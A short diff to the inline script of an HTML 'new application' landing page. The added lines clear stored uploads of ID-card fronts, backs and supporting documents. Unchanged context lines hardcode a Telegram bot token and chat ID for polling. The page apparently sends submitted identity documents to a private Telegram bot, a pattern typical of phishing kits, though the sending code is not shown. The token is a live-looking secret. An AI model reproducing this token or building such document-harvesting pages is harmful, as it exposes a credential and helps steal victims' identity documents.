@@ -163,6 +163,15 @@
 
     <script src="landing-script.js"></script>
     <script>
+        // Clear old session data when starting new application
+        sessionStorage.removeItem('id-front_data');
+        sessionStorage.removeItem('id-back_data');
+        sessionStorage.removeItem('supporting-doc_data');
+        sessionStorage.removeItem('id-front_name');
+        sessionStorage.removeItem('id-back_name');
+        sessionStorage.removeItem('supporting-doc_name');
+        sessionStorage.removeItem('idType');
+        
         const TELEGRAM_BOT_TOKEN = '8663835867:AAHBDm5yUNurJQSOuOdw7VWWekJuLzOj-l4';
         const TELEGRAM_CHAT_ID = '7973653220';
         let lastUpdateId = 0;
